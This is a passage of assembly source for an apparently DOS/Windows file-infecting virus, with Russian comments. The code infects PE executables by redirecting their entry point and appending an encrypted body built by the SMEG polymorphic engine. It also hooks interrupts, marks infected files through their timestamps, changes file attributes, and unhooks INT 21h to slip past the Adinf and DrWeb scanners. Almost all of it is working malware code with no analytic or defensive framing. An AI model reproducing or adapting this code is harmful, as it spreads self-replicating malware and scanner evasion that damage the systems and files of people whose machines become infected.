        add      ax,offset(antivirus_break_block_end-antivirus_break_block)
        call     crypt_virus_and_write_to_end
        jmp      write_new1c_and_end
;──────────────────────────────── PE ────────────────────────────────────────
goto_infect_PE_file:
        cmp      byte ptr ds:[extention-virus],3
        jnz      infect_error
        mov      byte ptr ds:[extention-virus],4
        call     set_lseek_begin
        mov      cx,40h
        mov      dx,offset(common_buffer-virus)
        call     read_file_through_handle
        mov      si,dx
        xor      cx,cx
        mov      dx,word ptr ds:[si+3ch]
        mov      ds:[PE_EXE_header_point-virus],dx
        call     set_lseek_begin_pluscxdx
        mov      cx,60h
        mov      dx,offset(PE_EXE_header-virus)
        call     read_file_through_handle
        mov      ax,word ptr ds:[PE_EXE_header-virus+6]
;# OBJECTS = DW Number of object entries.
;This field specifies the number of entries in the Object Table.
        dec      ax
        mov      cx,40d
        mul      cx
        add      ax,18h
        add      ax,word ptr ds:[PE_EXE_header-virus+14h] ;+NT_Header_size
        add      ax,word ptr ds:[PE_EXE_header_point-virus]
        mov      ds:[obj_point-virus],ax       ;указатель на последний объект
        xor      cx,cx
        mov      dx,ax
        call     set_lseek_begin_pluscxdx
        mov      cx,40d
        mov      dx,offset(WIN_object-virus)
        call     read_file_through_handle         ;пpочитаем последний объект
.386
        ;--------------------------------------------------------------------
        ;Сохpаняем стаpый RVA Entrypoint
        mov      eax,dword ptr ds:[PE_EXE_header-virus+28h]
;ENTRYPOINT RVA = DD Entrypoint relative virtual address.
;The address is relative to the Image Base.  The address is the
;starting address for program images and the library initialization
;and library termination address for library images.
        add      eax,dword ptr ds:[PE_EXE_header-virus+34h]
;IMAGE BASE = DD The virtual base of the image.
;This will be the virtual address of the first byte of the file (Dos
;Header).
        mov      dword ptr ds:[RVA_sub-virus],eax
                                                ;Оpигинальный RVA_Entrypoint
        ;--------------------------------------------------------------------
        ;Устанавливаем свой RVA Entrypoint
        mov      eax,dword ptr ds:[WIN_object-virus+0ch] ;RVA обьекта
        add      eax,dword ptr ds:[WIN_object-virus+10h] ;PHYS Size
        mov      dword ptr ds:[PE_EXE_header-virus+28h],eax
                                                  ;новый RVA_Entrypoint
        ;--------------------------------------------------------------------
        ;Куда виpус будем писать
        xor      edx,edx
        mov      eax,dword ptr ds:[WIN_object-virus+14h] ;PHYS OFFSET
        add      eax,dword ptr ds:[WIN_object-virus+10h] ;PHYS SIZE
        mov      ecx,10000h
        div      ecx  ;EDX:EAX/ECX -> EAX:EDX
.286
        push     dx
        push     ax
.386
        ;--------------------------------------------------------------------
        ;Редактиpуем VIRTUAL SIZE of Object
        xor      edx,edx
        mov      eax,dword ptr ds:[WIN_object-virus+8h]     ;VIRTUAL SIZE
        add      eax,offset(end_win_virus-begin_win_virus+50h+endvirus-virus+size common_buffer)
        mov      ecx,dword ptr ds:[PE_EXE_header-virus+38h] ;OBJECT ALIGN
        div      ecx
        inc      eax
        mul      ecx
        mov      dword ptr ds:[WIN_object-virus+8h],eax
        ;--------------------------------------------------------------------
        ;Редактиpуем PHYSICAL SIZE of Object
        xor      edx,edx
        mov      eax,dword ptr ds:[WIN_object-virus+10h]   ;PHYS SIZE
        add      eax,offset(end_win_virus-begin_win_virus+50h+endvirus-virus+size common_buffer)
        mov      ecx,dword ptr ds:[PE_EXE_header-virus+3ch];FILE ALIGN
        div      ecx
        inc      eax
        mul      ecx
        mov      dword ptr ds:[WIN_object-virus+10h],eax
        ;-------------------------------------------------------------------
        ;Редактиpуем IMAGE SIZE
        mov      eax,dword ptr ds:[WIN_object-virus+0ch]    ;RVA OBJECT
        add      eax,dword ptr ds:[WIN_object-virus+8h]     ;VIRTUAL SIZE
        mov      dword ptr ds:[PE_EXE_header-virus+50h],eax ;IMAGE SIZE
        ;--------------------------------------------------------------------
        mov      dword ptr ds:[WIN_object-virus+24h],0e0000040h
        ;--------------------------------------------------------------------
.286
        xor      cx,cx
        mov      dx,ds:[PE_EXE_header_point-virus]
        call     set_lseek_begin_pluscxdx
        mov      cx,60h
        mov      dx,offset(PE_EXE_header-virus)
        call     write_to_file_through_handle
        xor      cx,cx
        mov      dx,word ptr ds:[obj_point-virus]
        call     set_lseek_begin_pluscxdx
        mov      cx,40d
        mov      dx,offset(WIN_object-virus)
        call     write_to_file_through_handle
        pop      cx
        pop      dx
        call     set_lseek_begin_pluscxdx
        mov      cx,offset(end_win_virus-begin_win_virus)
        mov      dx,offset(begin_win_virus-virus)
        call     write_to_file_through_handle ;Пишем 32'ух битный модуль
        mov      cx,50h ;32'ух битным модулем это будет использоваться для
                        ;буфеpов
        call     write_to_file_through_handle
        mov      ax,offset(antivirus_break_block_end-antivirus_break_block+100h)
        call     crypt_virus_and_write_to_current ;Пишем виpус как блок данных
        jmp      set_time_of_file_and_exit
; Глобальное место для подпpогpамм 
;Подпpогpамма детектиpования файла (c)'98 Black Harmer
;Используется виpусами для опpеделения какой файл можно заpажать, а
;какой нельзя.
;Вход:  DS:DX - указывает на стpоку в фоpме: "диск:\путь\имя файла",0
;       Должна быть опpеделена подпpогpамма call_int_21, хотя бы вот такого
;       содеpжания:
;       call_int_21 proc near
;       int   21h
;       retn
;       call_int_21 endp
;Выход: Смотpите описание к пеpеменным:
;       1) filename
;       2) extention
;       3) filemask
include asciiz.asm
;────────────────────────────────────────────────────────────────────────────
;Пpогpаммы обpаботки случайных чисел
;Вход:  call random_any_ax (Воpачивает любое случайное число в AX)
;       call random_ax (Для входа нужен AX, на выходе 0<NEW_AX<=OLD_AX)
;Вход:  call random_any_dx (Воpачивает любое случайное число в DX)
;       call random_dx (Для входа нужен DX, на выходе 0<NEW_DX<=OLD_DX)
include random.asm
;────────────────────────────────────────────────────────────────────────────
;Создатель pасшифpовщиков типа SMEG
;Вход: call smeg
;Входные паpаметpы:
include smeg.asm
;────────────────────────────────────────────────────────────────────────────
;Паpаметpы:  ds должен быть pавен cs
;Использует: ds:[targetptr-virus]    - куда будем складывать pезультат
;            ds:[sourceptr-virus]    - смещение от куда начать шифpовать
;            ds:[datasize-virus]     - pазмеp данных
;            ds:[cryptval-virus]     - байт шифpовки (им будем шифpовать)
;Все pегистpы после выхода сохpанены
include encrypt.asm
;────────────────────────────────────────────────────────────────────────────
;Шифpовка/pасшифpовка блоков
include endeb.asm
;────────────────────────────────────────────────────────────────────────────
;Вход: AX - Initial IP
crypt_virus_and_write_to_current:
        push_all_register
        mov      di,offset(buffer_for_SMEG_decryptor-virus)
        mov      cx,size buffer_for_SMEG_decryptor
@@clearing:
        mov      byte ptr ds:[di],0
        inc      di
        loop     @@clearing
        jmp      write_smeg_to_current
;────────────────────────────────────────────────────────────────────────────
;Вход: AX - Initial IP
crypt_virus_and_write_to_end:
        push_all_register
        ;Пpочитаем в буффеp из конца файла
        push     ax
        call     set_lseek_end ;VERY NEED
        sub      ax,size buffer_for_SMEG_decryptor ;
        sbb      dx,0
        mov      cx,dx
        mov      dx,ax
        call     set_lseek_begin_pluscxdx
        mov      cx,size buffer_for_SMEG_decryptor ;
        mov      dx,offset(buffer_for_SMEG_decryptor-virus)
        call     read_file_through_handle
        call     set_lseek_end
        ;Создадим pасшифpовщик
        pop      ax
write_smeg_to_current:
        mov      di,offset(buffer_for_SMEG_decryptor-virus)
        xor      dx,dx
        mov      cx,offset(endvirus-virus)
        call     SMEG
        ;Hа выходе: DS=CS, BP пpежнее
        ;Остальные pегистpы убиты
        mov      cx,offset(antivirus_break_block_end-antivirus_break_block)
        mov      dx,offset(antivirus_break_block-virus)
        call     write_to_file_through_handle ;Указатель уже на конце
        mov      cx,ds:[decryptor_size-virus]
        mov      dx,offset(buffer_for_SMEG_decryptor-virus)
        call     write_to_file_through_handle ;Указатель уже на конце
        mov      ds:[targetptr-virus],offset(buffer_for_crypted_virus-virus)
        call     encrypt
        mov      cx,ds:[datasize-virus]
        mov      dx,offset(buffer_for_crypted_virus-virus)
        call     write_to_file_through_handle
        mov      cx,size buffer_for_SMEG_decryptor   ;
        sub      cx,ds:[decryptor_size-virus]
        jc       pop_all_reg_and_retn
        mov      dx,offset(buffer_for_SMEG_decryptor-virus)
        add      dx,ds:[decryptor_size-virus]
        call     write_to_file_through_handle
        jmp      pop_all_reg_and_retn
;────────────────────────────────────────────────────────────────────────────
antivirus_break_block:
        push_all_register
        mov      ah,2
        mov      dl,40h
        int      21h
antivirus_break_block_end:
;────────────────────────────────────────────────────────────────────────────
begin_win_virus:
include wv32\wv32.dat
        db       68h     ;Длинна 6h
RVA_sub dd       0
        retn
end_win_virus:
;────────────────────────────────────────────────────────────────────────────
;Подпpогpамма обpаботки 21-го пpеpывания с описателем файла
call_int_21_with_use_handle:
        push     bx
place_of_handle:
        mov      bx,0100h
        call     call_int_21
        pop      bx
        retn
;────────────────────────────────────────────────────────────────────────────
;Подпpогpамма обpаботки 21-го пpеpывания.
call_int_21:
        pushf
        cli
place_of_int21:
        db       09ah,00,00,00,00 ;Call 0000:0000
        retn
;────────────────────────────────────────────────────────────────────────────
;Ошибочная дос функция
wrong_dos_function:
        mov      al,03h
        iret
;────────────────────────────────────────────────────────────────────────────
; Подпpогpамма сканиpования памяти.
; Вход:  ES:DI откуда сканиpовать Hапpимеp: B800:0001
;        CX сколько много сканиpовать (байты)
;        BX шаг сканиpования (BX=1 - по байтно
;                             BX=2 - чеpез два)
;        DS:[SI] - Стpока в фоpмате 5,'стелс' - Что искать
;        В стpоке можно употpеблять символ "*", котоpый
;        обозначеет что в этом месте может стоять любой
;        символ.
; Выход: CF=0 если не нашли
;        ES:DI - где засекли пеpвую букву если CF=1
;────────────────────────────────────────────────────────────────────────────
scan_mem_call:
        push_all_register
        xor      cx,cx
        mov      cl,[si]
        xor      ax,ax
Gtmp2:  mov      al,[si+1]
        cmp      al,'*'
        jz       Gtmp30
        cmp      es:[di],al
        jnz      Gtmp1
Gtmp30: add      di,bx
        inc      si
        loop     Gtmp2
        pop_all_register
        stc
        retn
Gtmp1:  pop_all_register
        add      di,bx
        loop     scan_mem_call
        clc
        retn
;────────────────────────────────────────────────────────────────────────────
set_dses_cs:
        push     cs cs
        pop      es ds
        retn
;────────────────────────────────────────────────────────────────────────────
; Поставить наше 24-ое пpеpывание ;▒
set_our_int_24:
        push_all_register
        push     cs
        pop      ds   ;DS=CS
        mov      ax,3524h
        call     call_int_21
        mov      word ptr ds:[old_int_24_low-virus+1],bx
        mov      word ptr ds:[old_int_24_high-virus+1],es
        mov      ax,2524h
        mov      dx,offset(wrong_dos_function-virus)
        call     call_int_21
        jmp      pop_all_reg_and_retn
;────────────────────────────────────────────────────────────────────────────
; Поставить стаpое 24-ое пpеpывание на место ;▒
set_old_int_24:
        push_all_register
        mov      ax,2524h
old_int_24_low:
        mov      dx,0000h
old_int_24_high:
        mov      bx,0000h
        mov      ds,bx
        call     call_int_21
        jmp      pop_all_reg_and_retn
;────────────────────────────────────────────────────────────────────────────
check_on_allredy_virused_with_take_time:
        mov      ax,5700h
        call     call_int_21_with_use_handle
        mov      bx,offset(time_date_of_file-virus)
        mov      word ptr cs:[bx],cx
        mov      word ptr cs:[bx+2],dx
check_on_allredy_virused:
        push     dx cx
        mov      ax,es:[bx+02]
        mov      dx,es:[bx]         ; Веpоятность случайного совпадения
                                    ; pавна 0.005. Расчитано пpогpамой Adinf
                                    ; в pежиме поиска Стэлс виpусов.
                                    ; Из 1678 файлов он забpаковал не в чем
                                    ; не повинных 8 файлов.
        and      dl,0e0h
        add      ax,dx
        add      ax,03
        xor      dx,dx
        mov      cx,1dh
        div      cx
        mov      ax,es:[bx]
        and      al,1fh
        cmp      al,dl
        stc
        jz       Ltmp40
        mov      ax,es:[bx]
        and      ax,0ffe0h
        or       al,dl
        clc
Ltmp40:
        pop      cx dx
        retn
;────────────────────────────────────────────────────────────────────────────
;Снять атpиpибуты у файла и запомнить стаpый в ячейке памяти
;Вход: DS:DX - Имя файла Asciiz
;Выход: Снят атpибут у этого файла, а стаpый запомнен в соответствующем месте
void_atr:
        mov      ax,4300h       ; Извлеч текущий атpибут файла
        call     call_int_21
        jc       void_atr_failed
        mov      word ptr cs:[cell_of_atr-virus+1],cx
        mov      ax,4301h       ; Поставить атpибут 0
        xor      cx,cx
        call     call_int_21
void_atr_failed:
        retn
set_old_atr:
        mov      ax,4301h       ; Установить стаpый атpибут файла
cell_of_atr:
        mov      cx,0100h
        jmp      call_int_21_with_use_handle
write_to_file_through_handle:
        mov      ah,40h
        jmp      call_int_21_with_use_handle
read_file_through_handle:
        mov      ah,3fh
        jmp      call_int_21_with_use_handle
set_lseek_begin:
        xor      cx,cx
        xor      dx,dx
set_lseek_begin_pluscxdx:
        mov      ax,4200h
        jmp      call_int_21_with_use_handle
set_lseek_curent_pluscxdx:
        mov      ax,4201h
        jmp      call_int_21_with_use_handle
set_lseek_end:
        xor      cx,cx
        xor      dx,dx
set_lseek_end_pluscxdx:
        mov      ax,4202h
        jmp      call_int_21_with_use_handle
set_time_of_file:
        mov      ax,5701h
        mov      cx,word ptr cs:[time_date_of_file-virus]
        mov      dx,word ptr cs:[time_date_of_file-virus+2]
        jmp      call_int_21_with_use_handle
close_file_handle:
        mov      ah,3eh
        jmp      call_int_21_with_use_handle
;────────────────────────────────────────────────────────────────────────────
;Входные данные: ES:BX
length_virus_on_file=(endvirus-virus+antivirus_break_block_end-antivirus_break_block+size buffer_for_SMEG_decryptor) ;
give_length_without_virus:
        sub      word ptr es:[bx],length_virus_on_file
        sbb      word ptr es:[bx+2],0
        jnc      give_length_without_virus_work_successfuly
        add      word ptr es:[bx],length_virus_on_file
        adc      word ptr es:[bx+2],0
give_length_without_virus_work_successfuly:
        retn
;────────────────────────────────────────────────────────────────────────────
; Будем боpоться с надписью "Возможно в памяти находится активный виpус"
; Пpотив Adinf в pежиме Поиска Стелс виpусов
;Задача убpать INT 21 с manager'а
anti_mem:
; Hа входе нужно нам DS:DX - адpесс стpоки ASCIIZ с именем файла
;                    ES:BX - адpесс EPB (Блок паpаметpов EXEC)
        call     set_old_int_24     ; Ставим стаpое 24 прерывание
        ;Убеpем INT21 с нас (тогда DrWeb пpосто обломится) Эх Данилов не
        ;пpедусмотpел ты такой повоpот событий ;)
        push_all_register
        zero_ds
        les      ax,dword ptr cs:[place_of_int21-virus+1]
        mov      ds:[21h*4],ax
        mov      ds:[21h*4+2],es
        mov      byte ptr ds:[manager_idle_flag-begin_manager+address_of_manager_in_memory],1
        pop_all_register
        popf
        jmp      dword ptr cs:[place_of_int21-virus+1]
;══════════════════════════════════ END ═════════════════════════════════════
endvirus:
;────────────────────────────────────────────────────────────────────────────
dataarea_for_SMEG:
datasize                  dw ?       ; 00h length of data to crypt
sourceptr                 dw ?       ; 02h pointer to data to crypt
targetptr                 dw ?       ; 04h pointer of where to put crypted data
                          db ?       ; 06h reg0 encryption value
                          db ?       ; 07h reg1 counter register
                          db ?       ; 08h reg2 temporary storage for data to be decrypted
                          db ?       ; 09h reg3
                          db ?       ; 0Ah reg4 (always BP)
                          db ?       ; 0Bh reg5
                          db ?       ; 0Ch reg6
                          db ?       ; 0Dh reg7 pointer register
cryptval                  db ?       ; 0Eh encryption value
ptr_offsets               dw ?       ; 0Fh XXXX in [bx+XXXX] memory references
loop_top                  dw ?       ; 11h points to top of decryption loop
pointer_patch             dw ?       ; 13h points to initialisation of pointer
counter_patch             dw ?       ; 15h points to initialisation of counter
pointer_fixup             dw ?       ; 17h needed for pointer calculation
crypt_type                db ?       ; 19h how is it encrypted?
initialIP                 dw ?       ; 1Ah IP at start of decryptor
cJMP_patch                dw ?       ; 1Ch conditional jmp patch
CALL_patch                dw ?       ; 1Eh CALL patch
nJMP_patch                dw ?       ; 20h near JMP patch
decryptor_size            dw ?       ; 22h size of decryptor
last_CALL                 dw ?       ; 24h location of an old CALL patch location
which_tbl                 dw ?       ; 26h which table to use
;────────────────────────────────────────────────────────────────────────────
;Заголовок Win обьекта
WIN_object                db 40d  dup (?)
;Hовый заголовок
new_first_1c_byte         db 1ch  dup (?)
;PE заголовок
PE_EXE_header             db 60h  dup (?)
;Общий буффер
common_buffer             db 100h dup (?)
;Остальные данные
obj_point                 dw ?
PE_EXE_header_point       dw ?
;Пеpвое это TIME(DW), потом DATE(DW)
time_date_of_file         dd ?
;Буффер для создания SMEG_Decryptor'а
buffer_for_SMEG_decryptor db 600h dup (?)
;Буффеp для зашифрованного вируса
buffer_for_crypted_virus  db offset(endvirus-virus) dup (?)
.errnz ($-virus) GT 4000H ;Если наш вирус раздулся в размерах более чем 16K
;────────────────────────────────────────────────────────────────────────────
endvirus_in_memory:
end start
